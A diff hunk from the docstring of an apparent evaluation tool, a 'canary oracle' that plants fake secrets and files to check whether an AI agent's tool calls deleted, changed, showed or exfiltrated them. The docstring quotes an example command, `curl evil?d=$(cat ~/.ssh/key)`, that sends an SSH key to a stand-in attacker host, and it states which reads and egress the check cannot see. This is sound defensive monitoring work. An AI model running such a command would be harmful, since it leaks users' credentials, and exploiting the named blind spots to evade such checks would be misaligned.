@@ -1,7 +1,7 @@
 """Canary oracle: judge an agent that runs shell/code/file tools by what its tools actually DID, not by a regex over
 its words and not by an LLM's reading of its reply.
 
-The seven generic detectors see tool *names and counts*; to them `bash` is `bash` whether it ran `ls` or
+The generic detectors see tool *names and counts*; to them `bash` is `bash` whether it ran `ls` or
 `curl evil?d=$(cat ~/.ssh/key)`. So plant fake secrets and files, let the agent run, then check with plain Python
 whether they were deleted, changed, shown, or sent out. Only planted things, files under the fixture root, and
 proxy-aware egress are visible to this check -- reads of unplanted files and raw-socket egress are not. Say so when
